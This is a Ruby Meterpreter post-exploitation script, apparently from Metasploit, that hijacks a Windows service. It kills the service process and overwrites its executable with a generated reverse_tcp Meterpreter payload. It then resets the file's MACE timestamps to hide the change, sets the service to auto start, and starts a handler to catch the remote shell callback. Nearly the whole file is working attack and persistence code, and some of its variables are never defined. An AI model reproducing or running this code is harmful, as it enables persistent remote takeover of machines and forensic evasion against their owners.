#
# Meterpreter script that alters the binary path of an existing windows 
# service to point to an uploaded, or existing, service-enabled payload
#
#by kernelsmith (kernelsmith+\x40+kernelsmith+\.com)

# TODO:  Check if I'm the owner of the service, and the exe?  sc query?

myname="replacebinpath"

#
# Options
#
opts = Rex::Parser::Arguments.new(
     "-h"  => [ false, " This help menu"],
     "-s"  => [ true, " The service with which to monkey (use key name, not display name)"],
     "-x"  => [ true, " eXchange (don't upload), point service bin path to <opt>, already on target"],
     "-u"  => [ true, " Upload an executable version of payload <opt> and point bin path to it"],
     "-r"  => [ true, " Use with -u: The IP of the Metasploit listener for the connect back"],
     "-p"  => [ true, " Use with -u: The port of the Metasploit listener for the connect back"],
     "-ch" => [ false, "Only check for the process, don't do anything"],
     "-l"  => [ false, " Only list service display names using the windows net start command"],
     "-v"  => [ false, " Be verbose, show me more commands and their outputs"],
     "-d"  => [ false, " Download the target service executable to use as a payload template"],
     "-t"  => [ true, " (Overrides -d) Use <opt> as payload exe template default->data/templates/service.exe"]
)

#
# Default parameters
#
upload = false
download = false
payload = "windows/meterpreter/reverse_tcp"
rhost = Rex::Socket.source_address("1.2.3.4")
rport = 4444
# TODO: add (better) error handling
template = nil
service = ''
checkonly = false
listonly = false
$kill = true
$verbose = false

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
	  print_line("\n#{myname} - Modify a service's binpath to point to a payload" + opts.usage)
          print_line("NOTES:\n    -d won't work until Msf::Util::EXE.to_win32pe_service\n" +
          "        supports arbitrary templates like to_win32pe does")
          print_line("    -t will work if the template is specifically prepared\n" +
          "        See lib/msf/util/exe.rb")
          print_line("EXAMPLES: \n    #{myname} -l\n" +
          "    #{myname} -ch -s wmiapsrv\n" +
          "    #{myname} -b C:\\\\backup.exe -s wmiapsrv " +
               "-u windows/meterpreter/reverse_tcp -r 10.1.1.1 -p 443\n" +
          "    #{myname} -u windows/meterpreter/reverse_tcp " +
              	"-r 192.168.1.1 -p 1001 -s wmiapsrv\n" +
          "    #{myname} -b C:\\\\backup.exe -s wmiapsrv -x " +
               "C:\\WINDOWS\\System32\\alg.exe")
          raise Rex::Script::Completed
	when "-d"
		download = true
	when "-x"
		replace = true
		dummyfile = val || client.fs.file.expand_path("%SystemRoot%")+"\\System32\\alg.exe"
	when "-u"
		upload = true
		payload = val
     when "-r"
                rhost = val || Rex::Socket.source_address("1.2.3.4")
     when "-p"
                rport = val.to_i
	when "-t"
		template = val 
	when "-ch"
		checkonly = true
	when "-s"
		service = val
	when "-l"
		listonly = true
	when "-v"
		$verbose = true
     end
end

def run_cmd(session, cmd)
	results=""
	print_status("Executing #{cmd}") if $verbose
	r = session.sys.process.execute("#{cmd}", nil, {'Hidden' => 'true', 'Channelized' => true})
        while(d = r.channel.read)
                results << d
        end
        r.channel.close
        r.close
        print_line("Results:\n#{results}") if $verbose
        results
end

def start_service(session, kname)
	# check os version? in case win2k or whatever doesn't have sc, microsoft says they all have it
	results = ""
	print_status("Setting #{kname} to auto start on reboot and trying to start it")
	results = run_cmd(session, "cmd.exe /c sc config #{kname} start= auto")
	print_status("Results:  #{results}")
	results = run_cmd(session, "cmd.exe /c sc start #{kname}")
        print_status("Results:  #{results}")
        results
end

def convert_to_display_name(session, kname)
	# converts a windows service key name (short name) to its diplay name (long name)
	results = run_cmd(session, "cmd.exe /c sc getdisplayname \"#{kname}\"")
	# [SC] GetServiceDisplayName SUCCESS  Name = Cool Blah Agent
	if results =~ /SUCCESS/
		arr=results.chomp.split('= ')
		return arr[1].strip
	else 
		return nil
	end
end

def convert_to_key_name(session, dname)
	# converts a windows service diplay name (long name) to its key name (short name)
	results =""
	results = run_cmd(session, "cmd.exe /c sc getkeyname \"#{dname}\"")
	# [SC] GetServiceKeyName SUCCESS  Name = Blah
	if results =~ /SUCCESS/
		arr=results.chomp.split('= ')
		#return the second thing
		return arr[1].strip
	else
		return nil
	end
end

def get_display_name(session, image)
     #given a service name, get it's display name using the sc commmand
     results = ""
     results=run_cmd(session, "cmd.exe /c sc qc #{image} | findstr \"DISPLAY_NAME\"")
     if not results =~ /DISPLAY_NAME/
          return nil
     else
          #DISPLAY_NAME       : Cool Display Name
          arr=results.chomp.split(": ")
          return arr[1].strip
     end
     return nil
end

def get_key_name(session, image)
	# converts a windows image name or PID to it's key name (short name) if it's a service exe
	# NOTE: To use this method, the service must be actively running
	results = ""
	if image.to_i > 0
		puts "I see a PID" if $verbose
		results = run_cmd(session, "tasklist /svc /nh /FI \"PID eq #{image}\"")
	else
		puts "I see an image name" if $verbose
		results = run_cmd(session, "tasklist /svc /nh /FI \"IMAGENAME eq #{image}\"")
	end
	# if "INFO:" shows up in results, it prolly failed, otherwise: Image PID KeyName
	return nil if results =~ /INFO:/
	arr=results.chop.split(' ')
	# return the 3rd thing
	puts arr.inspect if $verbose
	return arr[2]
end

def correlate_names(session, prochash)
        prochash['displayname'] = get_display_name(session, prochash['name'])	
        prochash['keyname'] = convert_to_key_name(session, prochash['displayname'])
	return prochash
end

def check_service_status(session, kname)
     # Windows seems inconsistent whether it does or does not require .exe 
	# so we check for .exe and try it both w/ and w/o .exe
	kname2=kname # need to dup here?
	goodname=kname # default to kname being the good name
	if kname =~ /.exe$/i #end of string, and case insensitive
		#kname does have an exe on the end
		kname2 = kname.chomp(".exe") # rip off the exe
	else
		#kname doesn't have an exe on the end, let's add one
		kname2 = kname+".exe"
	end
	results=''
	results=run_cmd(session, "cmd.exe /c sc query #{kname}")
	if results =~ /FAILED/
		# try again with kname2
		results=run_cmd(session, "cmd.exe /c sc query #{kname2}")
		goodname=kname2 #set goodname to kname2 cuz kname didn't work
	end
	return nil if results =~ /FAILED/
	return goodname
end

def check_service_config(session, kname)
	results = ""
	results=run_cmd(session, "cmd.exe /c sc qc #{kname}")
	return nil if results =~ /FAILED/	
	return results
end

def get_proc_info(session, proc)
	print_status("Gathering service info on running processes...")
	print_status("	I only grab the first one that regex/insensitive matches " +
         "#{proc}")
	session.sys.process.get_processes().each do |m|
        	if ( m['name'] =~ /#{proc}/i ) # case insensitive
        	        # ok, we found the process, let's figure out the windows
                        #     key name & display name
                        print_status("Correlating windows service image, key, and display names")
        		m = correlate_names(session,m) 
                	print_status("Found your process running:\n #{m.inspect}")
                	return m # break out of the each loop so we only get one 
                    #    hash, not an array of hashes
        	end # end if
	end # end do block
	
	print_status("I didn't find your service, maybe it's just not running, " +
         "let me check")
	goodname = check_service_status(client, proc) 
	raise RuntimeError, "Awww shiz, I can't find any running or stopped " +
          "process matching #{proc}" if not goodname
	print_status("Cool, #{goodname} is a registered service, it's just NOT " +
          "RUNNING, but I can deal with that...")
	
	# otherwise the service isn't started, but it does exist, so lets run with it
	# and in this case we won't have to kill the process as it's not running
	$kill = false
	# TODO:  Instantiate a full process hash like get_processes.each, fake it for now
	m = {}
	m['name'] = goodname # set the name to the name that actually worked
        # ok, let's figure out the windows service key name & display name
        h = correlate_names(session,m)
        print_status("OK, we're using this unstarted service:\n	#{h.inspect}")
        return h # we gots our stuff
end # end def get_proc_info

def get_all_proc_info(session)
     print_status("Gathering service info on all running processes,")
     procarray = session.sys.process.get_processes()
     procarray.each_index do |i|
     #Returns an array of processes with hash objects that have keys for 
     #    ‘pid’, ‘name’, and ‘path’ etc.
     #    {"pid"=>4076,
     #    "parentid"=>948, 
     #    "name"=>"cmd.exe", 
     #    "path"=>"C:\\WINDOWS\\System32\\cmd.exe", 
     #    "session"=>0, 
     #    "user"=>"NT AUTHORITY\\SYSTEM", 
     #    "arch"=>"x86"}
          procarray[i] = correlate_names(session,procarray[i])
     end
     return procarray
end

if listonly
     all = get_all_proc_info(client)
     all.each do |p|
          print_line("#{p.to_s}")
     end
     raise Rex::Script::Completed
end

if checkonly
	info=get_proc_info(client, service)
	print_status("RESULTS:  Check Succeeded, I can try this on:\n#{info.inspect}")
	raise Rex::Script::Completed
end

def setmace(session,file2set,macehash)
	print_status("Resetting MACE attributes on #{file2set}")
	session.core.use("priv")
	suckit=session.priv.fs.set_file_mace(file2set, macehash['Modified'], macehash['Accessed'], macehash['Created'], macehash['Entry Modified'])
	raise RuntimeError, "Unable to set MACE" if not suckit
end

# Since service is often restarted by the windows service manager in 
#   about 1 second, let's get some stuff done before we kill the process

# TODO: check if running as system, otherwise auto migrate?
# if (not simple.client.auth_user)

# get process info
# {"pid"=>4076, "parentid"=>948, "name"=>"cmd.exe", "path"=>"C:\\cmd.exe", 
#    "user"=>"NT AUTHORITY\\SYSTEM"}
prochash = get_proc_info(client, service)
# get MACE attributes for actual exe
client.core.use("priv")
print_status("Grabbing the MACE attributes for the original exe")
originalMACE=client.priv.fs.get_file_mace(prochash['path'])
raise RuntimeError, "Unable to set MACE" if not originalMACE

if download
	# Download exe to use as a template, make sure we can do this before 
     #    service is stopped
	template = "data/templates/downloadedtemplate.exe"
	print_status("Downloading #{prochash['path']}")
	client.fs.file.download_file("#{template}", prochash['path'])
	print_status(" - #{prochash['path']} downloaded as #{template}")
end # end download prep

if upload
	# Build out the exe payload.
	print_status("Generating executable payload using optional template " +
          "(#{template}) to replace #{prochash[path]}")
	pay = client.framework.payloads.create("#{payload}")
	pay.datastore['LHOST'] = rhost
	pay.datastore['LPORT'] = rport
	raw  = pay.generate
	#exe = Msf::Util::EXE.to_win32pe_service(client.framework, raw, 
     #    {:servicename => prochash['name'], :template => "#{template}"})
	exe = Msf::Util::EXE.to_win32pe_service(client.framework, raw)
	#exe = Msf::Util::EXE.to_win32pe(client.framework, raw, {:template => template})
end # end upload prep

#
# Finally, let's start the killing, if we want to
#
if $kill
	print_status("Killing off #{prochash['name']}...")
	client.sys.process.kill(prochash['pid'])
end

#
# Backup/Delete/Replace/Upload
#

if backup
	# Create a backup of the original exe.
	print_status("Renaming #{prochash['path']} to #{backupfile}")
	run_cmd(client,"cmd.exe /c rename #{prochash['path']} #{backupfile}")
	# Set the MACE attributes on backupfile back to the original, you don't 
     #    really need this
	#setmace(client, "#{backupfile}", originalMACE) 
end # end backup

if delete
	print_status("Deleting #{prochash['path']}")
	run_cmd(client,"cmd.exe /c del \"#{prochash['path']}\"")
end # end delete
	
if replace
	print_status("Replacing #{prochash['path']} with #{dummyfile}")
	cmd = "cmd.exe /c copy /y \"#{dummyfile}\" \"#{prochash['path']}\""
	print_status("Executing #{cmd}")
	client.sys.process.execute("#{cmd}" ,nil,{'Hidden' => true,'UseTokenThread' => true})
	# Reset MACE attribs
	setmace(client, prochash['path'], originalMACE)
	start_service(client, prochash['keyname'])
elsif upload
	# Replace the file with our previously created exe
	print_status("Uploading EXE payload as #{prochash['path']}")
	fd = client.fs.file.new(prochash['path'], "wb")
	raise RuntimeError, "Unable to open file for writing" if not fd
	fd.write(exe)
	fd.close
	# Reset MACE attributes
	setmace(client, prochash['path'], originalMACE)
	print_status("I'm assuming you need a handler so, starting another "+
         "handler to handle the callback...")
	print_status("You should get a session as soon as the windows service " +
         "manager restarts \"#{prochash['name']}\" or you start it manually")

	# Our handler to recieve the callback.
	handler = client.framework.exploits.create("multi/handler")
	handler.datastore['PAYLOAD'] = payload
	handler.datastore['LHOST']   = rhost
	handler.datastore['LPORT']   = rport
	handler.datastore['ExitOnSession'] = false
	handler.exploit_simple(
		'Payload'        => handler.datastore['PAYLOAD'],
		'RunAsJob'       => true
	)
	#print_status("Forcibly restarting the effected service")
	start_service(client, prochash['keyname'])
end # end replace/upload